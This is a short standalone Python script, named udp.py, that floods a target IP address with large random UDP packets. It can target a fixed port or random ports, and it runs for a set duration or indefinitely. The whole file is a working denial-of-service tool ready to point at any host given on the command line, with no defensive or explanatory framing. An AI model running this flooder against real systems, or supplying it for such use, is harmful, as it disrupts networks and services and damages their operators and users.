import socket
import random
import sys
import time

if len(sys.argv) != 4:
    sys.exit("Usage: udp.py <ip> <port(0=random)> <length(0=forever)>")

def udp_flood():
    try:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        duration = int(sys.argv[3])
        random_port = port == 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(65500)        
        end_time = time.time() + duration if duration > 0 else None        
        while True:
            target_port = random.randint(1, 65535) if random_port else port
            sock.sendto(payload, (ip, target_port))
            
            if end_time and time.time() > end_time:
                break

    except KeyboardInterrupt:
        None
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    udp_flood()